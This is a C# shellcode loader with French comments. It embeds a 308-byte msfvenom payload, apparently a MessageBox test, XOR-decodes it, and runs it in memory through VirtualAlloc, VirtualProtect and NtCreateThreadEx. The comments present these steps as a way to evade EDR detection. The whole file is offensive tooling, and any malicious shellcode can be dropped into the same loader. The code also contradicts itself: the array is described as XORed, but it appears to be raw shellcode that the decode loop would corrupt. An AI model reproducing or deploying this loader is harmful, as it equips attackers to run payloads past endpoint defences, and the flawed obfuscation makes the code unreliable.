﻿using System;
using System.Runtime.InteropServices;

namespace Loader
{
    public class BasicShellcodeLoader
    {
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint MEM_COMMIT_RESERVE = 0x3000;

        // Alloue de la mémoire virtuelle
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        // Modifie les permissions d'une région mémoire
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        // Crée un thread de manière plus furtive (moins détecté par les EDRs)
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            uint stackZeroBits,
            uint sizeOfStackCommit,
            uint sizeOfStackReserve,
            IntPtr bytesBuffer
        );

        // Attend la fin d'un thread
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            // Shellcode XORé (généré avec msfvenom, puis XORé avec 0xAA)
            byte[] sc = new byte[308] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
                0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,
                0x18,0x48,0x8b,0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
                0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,
                0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
                0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,
                0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
                0x67,0x48,0x01,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,
                0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,
                0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
                0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
                0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
                0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,
                0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
                0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
                0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
                0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
                0x00,0x00,0x00,0x00,0xe8,0x0d,0x00,0x00,0x00,0x54,0x65,0x73,
                0x74,0x20,0x72,0xc3,0xa9,0x75,0x73,0x73,0x69,0x00,0x5a,0xe8,
                0x0a,0x00,0x00,0x00,0x53,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,
                0x65,0x00,0x41,0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,
                0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,
                0xff,0xd5};

            // Clé XOR utilisée pour l'obfuscation
            byte xorKey = 0xAA;

            // Déchiffrement du shellcode en mémoire (XOR)
            for (int i = 0; i < sc.Length; i++)
            {
                sc[i] ^= xorKey;
            }

            // Allocation de mémoire avec PAGE_READWRITE pour éviter RWX direct
            int scSize = sc.Length;
            IntPtr allocMemAddr = VirtualAlloc(IntPtr.Zero, scSize, MEM_COMMIT_RESERVE, PAGE_READWRITE);
            Console.WriteLine($"Mémoire allouée à : 0x{allocMemAddr.ToInt64():X}");

            // Copie du shellcode déchiffré en mémoire
            Marshal.Copy(sc, 0, allocMemAddr, scSize);
            Console.WriteLine("Shellcode copié en mémoire.");

            // Changer la protection mémoire en PAGE_EXECUTE_READ (pas RWX)
            uint oldProtect;
            VirtualProtect(allocMemAddr, (int)scSize, PAGE_EXECUTE_READ, out oldProtect);
            Console.WriteLine("Mémoire passée en PAGE_EXECUTE_READ.");

            // Création d'un thread furtif avec NtCreateThreadEx
            IntPtr hThread;
            uint status = NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, (IntPtr)(-1), allocMemAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            
            if (status == 0)
            {
                Console.WriteLine("Thread créé avec succès !");
            }
            else
            {
                Console.WriteLine($"Erreur lors de la création du thread (code {status:X})");
            }

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}